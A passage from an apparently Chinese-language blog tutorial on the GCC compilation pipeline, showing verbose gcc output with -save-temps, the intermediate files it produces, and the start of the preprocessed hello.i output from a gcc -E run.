--verbose<br></code></pre></td></tr></table></figure><p>-save-temps：保留生成的中间文件</p><p>–verbose：用于查看编译流程</p><p><strong>编译流程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">Using built-in specs.<br>COLLECT_GCC=gcc<br>COLLECT_LTO_WRAPPER=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper<br>OFFLOAD_TARGET_NAMES=nvptx-none:amdgcn-amdhsa<br>OFFLOAD_TARGET_DEFAULT=1<br>Target: x86_64-linux-gnu<br>Configured with: ../src/configure -v --with-pkgversion=&#x27;Ubuntu 13.3.0-6ubuntu2~24.04&#x27; --with-bugurl=file:///usr/share/doc/gcc-13/README.Bugs --enable-languages=c,ada,c++,go,d,fortran,objc,obj-c++,m2 --prefix=/usr --with-gcc-major-version-only --program-suffix=-13 --program-prefix=x86_64-linux-gnu- --enable-shared --enable-linker-build-id --libexecdir=/usr/libexec --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --enable-bootstrap --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-libstdcxx-backtrace --enable-gnu-unique-object --disable-vtable-verify --enable-plugin --enable-default-pie --with-system-zlib --enable-libphobos-checking=release --with-target-system-zlib=auto --enable-objc-gc=auto --enable-multiarch --disable-werror --enable-cet --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-offload-targets=nvptx-none=/build/gcc-13-fG75Ri/gcc-13-13.3.0/debian/tmp-nvptx/usr,amdgcn-amdhsa=/build/gcc-13-fG75Ri/gcc-13-13.3.0/debian/tmp-gcn/usr --enable-offload-defaulted --without-cuda-driver --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu --with-build-config=bootstrap-lto-lean --enable-link-serialization=2<br>Thread model: posix<br>Supported LTO compression algorithms: zlib zstd<br>gcc version 13.3.0 (Ubuntu 13.3.0-6ubuntu2~24.04)<br>COLLECT_GCC_OPTIONS=&#x27;-o&#x27; &#x27;hello&#x27; &#x27;-save-temps&#x27; &#x27;-v&#x27; &#x27;-mtune=generic&#x27; &#x27;-march=x86-64&#x27;<br> /usr/libexec/gcc/x86_64-linux-gnu/13/cc1 -E -quiet -v -imultiarch x86_64-linux-gnu hello.c -mtune=generic -march=x86-64 -fpch-preprocess -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection -fcf-protection -o hello.i<br>ignoring nonexistent directory &quot;/usr/local/include/x86_64-linux-gnu&quot;<br>ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/13/include-fixed/x86_64-linux-gnu&quot;<br>ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/13/include-fixed&quot;<br>ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/13/../../../../x86_64-linux-gnu/include&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include <span class="hljs-string">&quot;...&quot;</span> search starts here:</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;...&gt; search starts here:</span><br> /usr/lib/gcc/x86_64-linux-gnu/13/include<br> /usr/local/include<br> /usr/include/x86_64-linux-gnu<br> /usr/include<br>End of search list.<br>COLLECT_GCC_OPTIONS=&#x27;-o&#x27; &#x27;hello&#x27; &#x27;-save-temps&#x27; &#x27;-v&#x27; &#x27;-mtune=generic&#x27; &#x27;-march=x86-64&#x27;<br> /usr/libexec/gcc/x86_64-linux-gnu/13/cc1 -fpreprocessed hello.i -quiet -dumpbase hello.c -dumpbase-ext .c -mtune=generic -march=x86-64 -version -fasynchronous-unwind-tables -fstack-protector-strong -Wformat -Wformat-security -fstack-clash-protection -fcf-protection -o hello.s<br>GNU C17 (Ubuntu 13.3.0-6ubuntu2~24.04) version 13.3.0 (x86_64-linux-gnu)<br>        compiled by GNU C version 13.3.0, GMP version 6.3.0, MPFR version 4.2.1, MPC version 1.3.1, isl version isl-0.26-GMP<br><br>GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072<br>Compiler executable checksum: 38987c28e967c64056a6454abdef726e<br>COLLECT_GCC_OPTIONS=&#x27;-o&#x27; &#x27;hello&#x27; &#x27;-save-temps&#x27; &#x27;-v&#x27; &#x27;-mtune=generic&#x27; &#x27;-march=x86-64&#x27;<br> as -v --64 -o hello.o hello.s<br>GNU assembler version 2.42 (x86_64-linux-gnu) using BFD version (GNU Binutils for Ubuntu) 2.42<br>COMPILER_PATH=/usr/libexec/gcc/x86_64-linux-gnu/13/:/usr/libexec/gcc/x86_64-linux-gnu/13/:/usr/libexec/gcc/x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/13/:/usr/lib/gcc/x86_64-linux-gnu/<br>LIBRARY_PATH=/usr/lib/gcc/x86_64-linux-gnu/13/:/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib/:/lib/x86_64-linux-gnu/:/lib/../lib/:/usr/lib/x86_64-linux-gnu/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-linux-gnu/13/../../../:/lib/:/usr/lib/<br>COLLECT_GCC_OPTIONS=&#x27;-o&#x27; &#x27;hello&#x27; &#x27;-save-temps&#x27; &#x27;-v&#x27; &#x27;-mtune=generic&#x27; &#x27;-march=x86-64&#x27; &#x27;-dumpdir&#x27; &#x27;hello.&#x27;<br> /usr/libexec/gcc/x86_64-linux-gnu/13/collect2 -plugin /usr/libexec/gcc/x86_64-linux-gnu/13/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/13/lto-wrapper -plugin-opt=-fresolution=hello.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -z now -z relro -o hello /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/13/crtbeginS.o -L/usr/lib/gcc/x86_64-linux-gnu/13 -L/usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/13/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/13/../../.. hello.o -lgcc --push-state --as-needed -lgcc_s --pop-state -lc -lgcc --push-state --as-needed -lgcc_s --pop-state /usr/lib/gcc/x86_64-linux-gnu/13/crtendS.o /usr/lib/gcc/x86_64-linux-gnu/13/../../../x86_64-linux-gnu/crtn.o<br>COLLECT_GCC_OPTIONS=&#x27;-o&#x27; &#x27;hello&#x27; &#x27;-save-temps&#x27; &#x27;-v&#x27; &#x27;-mtune=generic&#x27; &#x27;-march=x86-64&#x27; &#x27;-dumpdir&#x27; &#x27;hello.&#x27;<br></code></pre></td></tr></table></figure><p>这个时候存在多个文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hello  hello.c  hello.i  hello.o  hello.s<br></code></pre></td></tr></table></figure><p>随后我们单独实验每一步：</p><h4 id="预处理阶段："><a href="#预处理阶段：" class="headerlink" title="预处理阶段："></a>预处理阶段：</h4><p>加‘ -E ’选项可以单独进行预处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ gcc -E hello.c -o hello.i<br></code></pre></td></tr></table></figure><p>hello的内容有点奇怪，感兴趣自己研究吧，我再此只做简单介绍,可以直接看最后一部分，我感觉我也没太深究。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br></pre></td><td class="code"><pre><code class="hljs c"># <span class="hljs-number">0</span> <span class="hljs-string">&quot;hello.c&quot;</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/stdc-predef.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span> <span class="hljs-number">2</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;hello.c&quot;</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">28</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">33</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">394</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/features-time64.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">20</span> <span class="hljs-string">&quot;/usr/include/features-time64.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">21</span> <span class="hljs-string">&quot;/usr/include/features-time64.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/timesize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">19</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/timesize.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span 